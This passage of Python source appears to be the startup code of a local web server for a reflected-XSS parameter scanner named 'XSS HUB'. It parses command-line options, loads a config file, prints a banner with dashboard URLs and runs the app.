    p = argparse.ArgumentParser(description="XSS HUB server")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8787)
    p.add_argument("--debug", action="store_true")
    args = p.parse_args()

    load_config()  # write defaults if first run

    bar = "━" * 56
    print(f"\n  \033[33m⚡ XSS HUB\033[0m  ·  reflected parameter scanner")
    print(f"  {bar}")
    print(f"  dashboard      \033[36mhttp://{args.host}:{args.port}/\033[0m")
    print(f"  config page    \033[36mhttp://{args.host}:{args.port}/config\033[0m")
    print(f"  config file    {CONFIG_PATH}")
    print(f"  {bar}\n")

    app.run(host=args.host, port=args.port, debug=args.debug, threaded=True)
